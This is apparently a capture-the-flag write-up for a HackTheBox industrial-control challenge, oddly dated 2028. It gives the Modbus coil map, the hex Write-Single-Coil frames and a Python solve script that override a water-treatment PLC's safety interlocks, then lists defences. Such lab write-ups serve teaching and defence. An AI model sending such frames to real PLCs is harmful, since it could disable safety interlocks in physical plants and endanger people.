---
layout: post
title: "State of Emergency"
date: 2028-05-26 09:00:00 -0500
categories: [HackTheBox, Challenges, ICS]
tags: [hackthebox, challenge, ics, scada, modbus, plc, write-single-coil, cwe-306]
description: "An exposed serial-Modbus gateway with no authentication lets a single Write-Single-Coil frame override a water-treatment PLC's safety interlocks — the only catch is finding the non-standard slave IDs."
---

## Overview

State of Emergency is a **Medium** HackTheBox **ICS** challenge. You get a PDF of a
water-treatment facility and a netcat CLI that is the attacker's serial-Modbus
implant. Because Modbus has no authentication, a handful of Write-Single-Coil
frames can override the PLC's safety interlocks and open a clear water path — at
which point the tank PLC prints its flag. The real difficulty is that the PLC
unit/slave IDs are non-standard, so the obvious `slave 1` writes silently do
nothing.

## The technique

The CLI exposes two commands:

- `system` — a JSON status dump of the water-tank and mixer PLCs, including a
  `flag` field that starts empty (`HTB{}`).
- `modbus AABBCCDDEE[FF]` — sends a raw Modbus RTU frame onto the bus. The gateway
  appends the CRC and **fire-and-forwards** it: no acknowledgement, no error on a
  bad frame.

Modbus (RTU/TCP) has **no authentication and no integrity** — anyone who reaches
the bus can issue [Write Single Coil](https://cwe.mitre.org/data/definitions/306.html)
(function `0x05`) to any coil and drive the PLC's actuators directly. The
challenge PDF is the exploit blueprint: it publishes the coil map and the tank's
state machine. Extract the diagrams with `pdfimages -png water_treatment_facility.pdf out`.

- **Water tank coils:** `manual_mode_control 200`, `low_sensor 64`, `high_sensor 65`,
  `force_start_out 1234`, `force_start_in 1336`, `start 53`, `cutoff 206`.
- **Mixer coils:** `high_sensor 68`, `low_sensor 67`, `start 45`.

The state machine has two override transitions straight into the flow states:
**Force Start In → Filing** (input valve on) and **Force Start Out → Drain**
(output valve on).

## The gotcha: non-standard slave IDs

The first wall is that writing coils to slave `1` (the Modbus default) forwards
cleanly and changes nothing. Modbus writes are fire-and-forget, so a wrong
unit/slave id fails **silently** — the only feedback is polling `system`. The PLC
unit IDs here are **water tank = `0x88`, mixer = `0x35`**. Read them off the
diagram, or fuzz the unit-id byte.

## Solution

A Write-Single-Coil frame is `[slave] 05 [coil-hi coil-lo] [value-hi value-lo]`,
with `FF00` = ON and `0000` = OFF. The winning sequence opens the path from tank
to mixer to output:

```
88 05 00C8 FF00    manual_mode_control(200) ON   drop auto_mode so the reset rung stops wiping overrides
88 05 0538 FF00    force_start_in(1336) ON       input valve
88 05 04D2 FF00    force_start_out(1234) ON      output valve (Force Start Out -> Drain)
88 05 0040 0000    low_sensor(64) OFF            unblock the drain
35 05 0044 FF00    mixer high_sensor(68) ON      mixer drains
```

`solve.py` drives these through the CLI (one command per line — sending them all
at once returns `[!] Invalid cmd format`), then reads `system` and pulls the flag
from the tank PLC's JSON:

```python
CMDS = [
    "modbus 880500C8FF00",   # water tank: manual_mode_control ON
    "modbus 88050538FF00",   # water tank: force_start_in ON
    "modbus 880504D2FF00",   # water tank: force_start_out ON
    "modbus 880500400000",   # water tank: low_sensor OFF
    "modbus 35050044FF00",   # mixer: high_sensor ON
    "system",
]

s.sendall(("\n".join(CMDS) + "\n").encode())
# ... drain output, then:
import re
m = re.search(r'HTB\{[^}]+\}', text)
print("FLAG:", m.group())
```

After the sequence, `system` shows the tank `out_valve: 1`, mixer `out_valve: 1`,
and the `flag` field populated with `HTB{...}`. (The docker instance in this
challenge flaps hard — the API target goes null and connections reset — so the
script also polls and auto-restarts the container and reconnects on reset.)

## Why it worked

The ladder logic trusts sensor and mode values that are all attacker-writable
coils. Forcing manual mode stops the auto-reset rung from wiping the overrides
each scan; forcing the output valves and clearing the low-sensor interlock opens
the physical path that the PLC's flag-release condition is gated on.

## Fix / defense

- Front Modbus with an authenticating gateway / VPN; never expose the bus to
  user-reachable networks — segment it to a dedicated OT VLAN.
- Do not expose manual-override / force-start coils to remote writes — gate them
  behind a physical key switch.
- Deploy an ICS firewall / Modbus deep-packet-inspection that whitelists allowed
  function codes and coil ranges (deny `0x05` to override coils).
- Treat the ladder-logic / L5X export as sensitive: its coil map is an exploit
  blueprint.
